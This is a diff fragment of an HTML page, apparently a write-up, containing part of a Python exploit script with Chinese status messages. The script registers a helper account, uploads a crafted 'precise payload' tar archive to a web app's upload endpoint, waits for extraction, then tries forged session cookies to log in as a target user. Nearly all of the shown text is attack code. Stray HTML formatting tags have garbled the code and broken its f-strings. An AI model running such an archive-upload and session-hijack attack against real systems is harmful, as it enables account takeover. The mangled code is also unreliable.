@@ -700,14 +700,14 @@ HELPER_USER = “pwn_helper_99”_** </p>
 <p>print(f”[<em>] 正在准备上传助手: {HELPER_USER}”)<br />
  s.post(f”{BASE_URL}/register”, json={“username”: HELPER_USER, “password”: “p”})<br />
  s.post(f”{BASE_URL}/login”, data={“username”: HELPER_USER, “password”: “p”})_</em>*</p>
-<p><strong>_print(“[<em>] 正在构造并上传精准 Payload…”)<br />
+<p><strong><em int_time.time_="int(time.time())">print(“[*] 正在构造并上传精准 Payload…”)<br />
  tar_data = create_precise_tar()<br />
- files = {‘archive’: (f’exploit_{int(time.time())}.tar’, tar_data)}<br />
+ files = {‘archive’: (f’exploit</em>}.tar’, tar_data)<br />
  r = s.post(f”{BASE_URL}/user/upload”, files=files)<br />
- print(f”[</em>] 上传返回状态码: {r.status_code}”)<br />
- print(“[*] 等待解压落盘…”)<br />
+ print(f”[<em>] 上传返回状态码: {r.status_code}”)<br />
+ print(“[</em>] 等待解压落盘…”)<br />
  time.sleep(2)_</strong></p>
-<p>*<em>_print(f”[</em>] 正在尝试以 {TARGET_USER} 身份验证…”)<br />
+<p>**_print(f”[*] 正在尝试以 {TARGET_USER} 身份验证…”)<br />
  for sid in TARGET_SIDS:<br />
  cookies = {<br />
  “username”: TARGET_USER,<br />
